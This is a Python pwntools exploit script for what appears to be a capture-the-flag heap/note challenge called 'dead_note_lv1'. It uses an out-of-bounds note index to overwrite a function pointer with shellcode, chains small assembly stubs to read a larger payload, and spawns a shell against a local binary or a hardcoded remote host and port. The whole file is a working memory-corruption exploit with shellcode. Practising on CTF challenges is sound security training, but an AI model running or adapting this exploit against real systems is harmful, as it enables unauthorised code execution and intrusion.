#!/usr/bin/env python

from pwn import *
from struct import *
import re, base64


__LIBC__ = ""
__NAME__ = "dead_note_lv1"
__REMOTE__ = "159.89.197.67"
__REMOTE_PORT__ = 3333
__GDB__ = """
c
"""

context.arch = 'amd64'

if __name__ == "__main__":

	log.info("pwning %s"  % __NAME__)


	if args.REMOTE:

		log.info("remote run")

		r = remote(__REMOTE__, __REMOTE_PORT__)

	else:

		log.info("local run")

		if args.GDB:

			if args.GDB == 'attach':

				r = process("./%s" % __NAME__, env={'LD_PRELOAD': __LIBC__})

				log.info("attaching gdb...")

				gdb.attach(r.pid, __GDB__)	

			else:

				r = gdb.debug("./%s" % __NAME__, __GDB__)
		else:

			r = process("./%s" % __NAME__, env={'LD_PRELOAD': __LIBC__})


	def _add(idx, number, data):

		r.sendlineafter("Your choice: ", "1")
		r.sendlineafter("Index: ", str(idx))
		r.sendlineafter("Number of Note: ", str(number))
		r.sendlineafter("Content: ", str(data))

	def _del(idx):
		r.sendlineafter("Your choice: ", "2")
		r.sendlineafter("Index: ", str(idx))



	sh = asm("xor eax, eax; ret;")

	log.info("sh len: %d" % len(sh))
	
	idx = (0x202028 - 0x02020E0 )/8

	log.info("overwriting len()")

 	_add(idx, 1, sh)
 	
 	_add(1, 1, asm("mov dl, 0x50; syscall; jmp rsi;"))

 	_add(idx, 1, asm("nop; xor eax, eax; xor edi, edi; jmp $-0x20-5"))

 	_add(1, 1, "dummy")

	r.sendline(asm(shellcraft.amd64.linux.sh()))

	r.sendline("ls")
	r.interactive()

